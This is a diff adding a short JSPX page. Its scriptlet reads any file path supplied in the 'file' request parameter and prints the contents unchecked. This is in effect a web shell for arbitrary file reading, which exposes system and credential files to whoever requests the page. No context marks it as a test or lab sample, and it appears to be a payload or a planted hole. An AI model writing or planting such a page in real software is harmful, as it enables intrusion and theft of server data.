@@ -1,0 +1,15 @@
+<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" version="2.0">
+    <jsp:directive.page import="java.io.IOException"/>
+    <jsp:directive.page import="java.nio.file.Paths"/>
+    <jsp:directive.page import="java.nio.file.Files"/>
+    <pre>
+    <jsp:scriptlet>
+        try {
+            byte[] bytes = Files.readAllBytes(Paths.get(request.getParameter("file")));
+            out.println(new String(bytes));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    </jsp:scriptlet>
+    </pre>
+</jsp:root>
